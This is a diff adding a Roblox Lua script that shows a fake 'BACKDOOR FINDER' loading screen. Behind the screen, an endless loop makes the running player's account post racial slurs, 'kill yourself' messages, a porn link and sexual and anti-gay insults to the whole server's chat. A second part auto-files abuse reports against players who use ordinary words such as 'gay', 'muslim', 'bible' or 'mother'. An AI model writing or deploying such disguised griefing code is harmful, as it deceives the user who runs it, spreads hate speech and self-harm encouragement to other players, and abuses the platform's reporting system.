@@ -1,0 +1,173 @@
+local co = game.CoreGui
+local sc = Instance.new("ScreenGui", co)
+local fr = Instance.new("TextLabel", sc)
+
+fr.Text = "SETUP (BACKDOOR FINDER v 5.6) Loading (4-6 minutes)..."
+fr.Size = UDim2.new(0, 1200, 0, 1000)
+fr.TextColor3 = Color3.new(1, 0, 0)
+fr.TextSize = 20
+fr.Position = UDim2.new(0, -4, 0, -258)
+fr.BackgroundColor3 = Color3.new(0, 0, 0)
+--[[
+fr.Active = true
+fr.Draggable = true
+--[[]]
+
+--[[]]
+wait(0.5)
+while true do
+wait(3)
+
+local message = "NIGGER NIGGER FUCK FUCK FUCK BITCH KILL YOUR SELF"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "PUSSY PUSSY PUSSY"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "Gonto https://Nigga.com for kill yourself nigger"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "https://pornhub.com/roblox porn"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "cock"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "gay"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "dick"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+local message = "furry"
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+
+
+end
+--[[]]
+
+
+-- https://scriptblox.com/script/Universal-Script-OPEN-SOURCE-Universal-Auto-Report-Script-11095
+
+--Enjoy!
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+local lib = {
+    ['cooldown'] = false,
+    ['username'] = 'unknown',
+    ['bw'] = 'unknown'
+}
+
+local words = {
+    ['NIGGER'] = 'Bullying',
+    ['gay'] = 'Bullying',
+    ['trans'] = 'Bullying',
+    ['lgbt'] = 'Bullying',
+    ['lesbian'] = 'Bullying',
+    ['suicide'] = 'Bullying',
+    ['cum'] = 'Swearing',
+    ['f@g0t'] = 'Bullying',
+    ['cock'] = 'Swearing',
+    ['penis'] = 'Swearing',
+    ['furry'] = 'Bullying',
+    ['furries'] = 'Bullying',
+    ['dick'] = 'Swearing',
+    ['nigger'] = 'Bullying',
+    ['bible'] = 'Bullying',
+    ['nigga'] = 'Bullying',
+    ['cheat'] = 'Scamming',
+    ['report'] = 'Bullying',
+    ['niga'] = 'Bullying',
+    ['bitch'] = 'Bullying',
+    ['sex'] = 'Swearing',
+    ['cringe'] = 'Bullying',
+    ['trash'] = 'Bullying',
+    ['allah'] = 'Bullying',
+    ['dumb'] = 'Bullying',
+    ['idiot'] = 'Bullying',
+    ['kid'] = 'Bullying',
+    ['clown'] = 'Bullying',
+    ['bozo'] = 'Bullying',
+    ['faggot'] = 'Bullying',
+    ['autist'] = 'Bullying',
+    ['autism'] = 'Bullying',
+    ['get a life'] = 'Bullying',
+    ['nolife'] = 'Bullying',
+    ['no life'] = 'Bullying',
+    ['adopted'] = 'Bullying',
+    ['skill issue'] = 'Bullying',
+    ['muslim'] = 'Bullying',
+    ['gender'] = 'Bullying',
+    ['parent'] = 'Bullying',
+    ['islam'] = 'Bullying',
+    ['christian'] = 'Bullying',
+    ['noob'] = 'Bullying',
+    ['retard'] = 'Bullying',
+    ['burn'] = 'Bullying',
+    ['stupid'] = 'Bullying',
+    ['wthf'] = 'Swearing',
+    ['pride'] = 'Bullying',
+    ['mother'] = 'Bullying',
+    ['father'] = 'Bullying',
+    ['homo'] = 'Bullying',
+    ['hate'] = 'Bullying',
+    ['exploit'] = 'Scamming',
+    ['hack'] = 'Scamming',
+    ['download'] = 'Scamming',
+    ['youtube'] = 'Offsite Links',
+    ['racist'] = 'Bullying',
+    ['covid'] = 'Bullying',
+    ['virus'] = 'Bullying',
+    ['mask'] = 'Bullying',
+    ['pandemic'] = 'Bullying',
+    ['china'] = 'Bullying',
+    ['vaccine'] = 'Bullying',
+    ['politics'] = 'Bullying',
+    ['trump'] = 'Bullying',
+    ['biden'] = 'Bullying'
+}
+
+local players = game:GetService('Players')
+local user = game:GetService('Players').LocalPlayer
+
+function lib.notify(title, description, icon)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = description,
+        Icon = icon
+    })
+end
+
+function lib.report(userId, name, rs)
+    if userId and lib.cooldown == false then
+        lib.username = name
+        local suc, er = pcall(function()
+            players:ReportAbuse(players:FindFirstChild(name), rs, 'breaking TOS')
+        end)
+        if not suc then
+            warn("Couldn't report due to the reason: " .. er .. ' | AR')
+        else
+--            lib.notify("Nextix's Auto-Report", "Reported " .. lib.username .. ' for saying "' .. lib.bw .. '"', "rbxassetid://6023426926")
+        end
+        lib.cooldown = true
+        task.wait(5)
+        lib.username = 'unknown'
+        lib.bw = 'unknown'
+        lib.cooldown = false
+    end
+end
+
+players.PlayerChatted:Connect(function(chatType, plr, msg)
+    msg = string.lower(msg)
+    if chatType ~= Enum.PlayerChatType.Whisper and plr ~= user then
+        for i, v in pairs(words) do
+            if string.find(msg, i) then
+                lib.bw = i
+                lib.report(plr.UserId, plr.Name, v)
+            end
+        end
+    end
+end)
